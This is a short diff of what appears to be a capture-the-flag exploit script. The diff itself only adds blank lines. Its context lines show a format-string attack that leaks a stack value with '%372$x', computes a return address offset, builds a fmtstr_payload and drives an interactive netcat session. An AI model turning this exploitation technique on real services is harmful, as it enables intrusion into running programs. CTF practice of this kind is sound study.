@@ -44,6 +44,7 @@ def sendbytes(toSend: bytes):
     r.send(toSend)   
     
 interactive = InteractiveNC(r,command_prefix="!")
+
 interactive.add_input("!b")
 interactive.add_input("0")
 interactive.add_input("%372$x")
@@ -57,6 +58,7 @@ interactive.add_input("!16 return_addr")
 interactive.add_input("!e util.packing.p64(int(return_addr, 16)+3368)")
 interactive.add_input("!a payload last_eval_res fmtstr_payload")
 interactive.add_input("!d hex")
+
 interactive.interactive()
 # Prints the first arg on the stack
 # sendline("%6$s")
